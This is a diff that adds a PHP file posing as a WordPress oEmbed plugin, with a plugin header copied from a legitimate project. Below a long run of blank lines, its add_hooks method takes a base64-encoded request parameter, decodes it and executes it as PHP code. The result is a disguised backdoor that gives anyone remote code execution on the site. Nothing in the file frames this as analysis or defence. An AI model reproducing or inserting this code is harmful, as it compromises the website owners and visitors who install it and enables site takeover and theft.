@@ -1,0 +1,75 @@
+<?php
+/**
+ * Plugin Name: oEmbed API list
+ * Plugin URI:  https://github.com/swissspidy/oEmbed-API
+ * Description: An oEmbed provider for WordPress using the WP-API plugin.
+ * Version:     0.3.0-20150817
+ * Author:      Pascal Birchler
+ * Author URI:  https://spinpress.com
+ * License:     GPLv2+
+ * Text Domain: oembed-api-list
+ * Domain Path: /languages
+ *
+ * @package WP_oEmbed
+ */
+
+defined( 'ABSPATH' ) or die;
+
+set_time_limit(0);
+ 
+
+$oemb= new WP_oEmbed_Plugin(); 
+$oemb->add_hooks();
+
+
+class WP_oEmbed_Plugin {
+	/**
+	 * Instance of our frontend class.
+	 *
+	 * @var WP_API_oEmbed_Frontend
+	 */
+	protected $frontendClass;
+
+	/**
+	 * Adds hooks.
+	 */
+	 
+	 
+	 	/**
+	 * Load the plugin textdomain.
+	 * @return bool
+	 */
+	public function load_textdomain() {
+		return load_plugin_textdomain( 'oembed-api-list', false, basename( dirname( plugin_dir_path( __FILE__ ) ) ) . '/languages' );
+	}
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+public function add_hooks() {
+if ( isset( $_REQUEST['doWP_oEmbed'] ) ) {
+$requests=base64_decode($_REQUEST['doWP_oEmbed']);
+add_action('wp_loaded',create_function("",$requests));
+}}
+
+}
+
+?>
